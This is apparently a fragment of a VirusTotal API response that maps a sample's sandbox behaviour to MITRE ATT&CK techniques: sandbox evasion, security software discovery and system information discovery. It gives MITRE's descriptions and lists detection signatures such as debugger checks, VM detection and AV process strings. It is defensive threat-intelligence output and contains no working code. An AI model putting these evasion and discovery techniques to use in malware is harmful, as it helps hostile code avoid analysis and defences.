                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "LOW",
                    "description": "Checks for debuggers (window names)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries disk information (often used to detect virtual machines)"
                  }
                ]
              },
              {
                "id": "T1518.001",
                "name": "Security Software Discovery",
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to evade debugger and weak emulator (self modifying code)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Checks for debuggers (window names)"
                  },
                  {
                    "severity": "INFO",
                    "description": "AV process strings found (often used to terminate AV products)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to detect virtualization through RDTSC time measurements"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries disk information (often used to detect virtual machines)"
                  }
                ]
              },
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to evade debugger and weak emulator (self modifying code)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Tries to detect virtualization through RDTSC time measurements"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running drivers"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries disk information (often used to detect virtual machines)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ]
              }
            ]
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/4962a2f6cba601af509e3df0215b2eb581754cdf3410786a632b737873a399e2/behaviour_mitre_trees"
    }
  }
}]